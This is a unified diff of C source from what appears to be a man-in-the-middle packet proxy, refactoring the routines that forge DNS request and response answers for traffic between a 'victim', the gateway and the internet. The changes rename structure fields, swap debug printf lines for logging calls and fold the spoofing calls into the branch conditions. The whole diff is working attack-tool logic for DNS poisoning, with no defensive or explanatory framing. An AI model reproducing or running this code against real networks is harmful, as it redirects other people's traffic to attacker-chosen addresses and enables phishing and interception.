@@ -15,7 +15,7 @@
 #include "LinkedListFirewallRules.h"
 #include "LinkedListSpoofedDnsHosts.h"
 #include "Logging.h"
-#include "NetworkFunctions.h"
+#include "NetworkHelperFunctions.h"
 #include "PacketProxy.h"
 
 
@@ -162,15 +162,14 @@ void ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 {
   PHOSTNODE tmpNode = NULL;
 
-  // In case user sends DNS request to an external DNS server, send back
+  // When user sends DNS request to an external DNS server, send back
   // a spoofed answer packet.
-// DnsResponsePoisonerGetHost2Spoof
   if (packetInfo->udpHdr != NULL &&
-      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
+      DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->HostData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->HostData.HostName) == TRUE)
   {
-printf("DNSPOISONG.ProcessData2Internet(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-    DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
-    return;
+    LogMsg(DBG_INFO, "Request DNS poisoning C2I succeeded : %s -> %s", tmpNode->HostData.HostName, tmpNode->HostData.SpoofedIP);
+    return;    
   }
 
   CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
@@ -191,19 +190,15 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
   CopyMemory(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
   CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "IN");
-
-  // DNS RESPONSE SPOOFING
-  if (packetInfo->udpHdr != NULL && 
-      (tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
+  
+  // When user receives DNS response, send back
+  // a spoofed answer packet.
+  if (packetInfo->udpHdr != NULL &&
+      (tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
+      DnsResponseSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->HostData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->HostData.HostName) == TRUE)
   {
-printf("DNSPOISONG.ProcessData2Victim():  %s -> %s\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-    spoofedDnsPacketLen = sizeof(spoofedDnsPacket);
-    BuildSpoofedDnsReplyPacket(packetInfo->pcapData, packetInfo->pcapDataLen, tmpNode, spoofedDnsPacket, &spoofedDnsPacketLen);
-    if (pcap_sendpacket((pcap_t *)scanParams->InterfaceWriteHandle, (unsigned char *)spoofedDnsPacket, spoofedDnsPacketLen) == 0)
-    {
-      LogMsg(DBG_INFO, "Response DNS POisoning : %s -> %s", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-      return;
-    }
+    LogMsg(DBG_INFO, "Request DNS poisoning *2C succeeded : %s -> %s", tmpNode->HostData.HostName, tmpNode->HostData.SpoofedIP);
+    return;
   }
 
   pcap_sendpacket((pcap_t *)scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
@@ -215,12 +210,13 @@ void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 {
   PHOSTNODE tmpNode = NULL;
 
-  // DNS REQUEST SPOOFING
-  if (packetInfo->udpHdr != NULL && 
-      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof((u_char *)packetInfo->pcapData)) != NULL)
+  // When user sends DNS request to the gateway, send back
+  // a spoofed answer packet.
+  if (packetInfo->udpHdr != NULL &&
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
+      DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->HostData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->HostData.HostName) == TRUE)
   {
-printf("DNSPOISONG.ProcessData2GW(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-    DnsRequestSpoofing((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
+    LogMsg(DBG_INFO, "Request DNS poisoning C2GW succeeded : %s -> %s", tmpNode->HostData.HostName, tmpNode->HostData.SpoofedIP);
     return;
   }
 
